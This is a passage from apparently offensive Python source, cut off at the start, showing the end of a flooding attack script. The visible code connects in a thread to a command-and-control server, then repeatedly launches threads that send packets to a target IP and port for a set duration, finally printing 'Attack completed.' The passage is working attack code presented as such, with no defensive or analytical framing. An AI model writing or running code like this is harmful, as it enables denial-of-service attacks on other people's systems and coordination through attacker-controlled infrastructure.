            c2_sock.close()
        except Exception as e:
            print(f"Error connecting to C2 server: {e}")

    threading.Thread(target=connect_to_c2, args=(c2_server,)).start()

    start_time = time.time()
    while time.time() - start_time < duration:
        threading.Thread(target=send_packets, args=(target_ip, target_port)).start()
        time.sleep(0.1)

    print("Attack completed.")
